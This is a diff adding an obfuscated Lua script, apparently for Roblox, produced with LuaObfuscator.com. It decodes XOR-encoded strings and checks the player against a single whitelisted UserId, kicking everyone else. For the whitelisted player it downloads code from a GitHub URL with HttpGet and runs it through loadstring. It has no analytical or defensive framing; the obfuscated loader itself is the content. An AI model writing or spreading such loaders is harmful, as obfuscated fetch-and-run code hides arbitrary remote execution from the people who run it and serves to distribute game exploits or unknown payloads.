@@ -1,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.2) ~  Much Love, Ferib 
+
+]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v10,v11) local v12={};for v15=1, #v10 do v6(v12,v0(v4(v1(v2(v10,v15,v15 + 1 )),v1(v2(v11,1 + (v15% #v11) ,1 + (v15% #v11) + 1 )))%256 ));end return v5(v12);end local v8={3716262195 -(378 + 1044) };local v9=false;for v13,v14 in v8 do if (game.Players.LocalPlayer.UserId==v14) then v9=true;end end if  not v9 then game.Players.LocalPlayer:Kick(v7("\223\204\207\101\241\179\206\10\212\207\210\54\242\190\195","\126\177\163\187\69\134\219\167"));end if (v9==true) then loadstring(game:HttpGet("https://github.com/vanyamorozovuser/22222/blob/main/3333333333333",true))();end
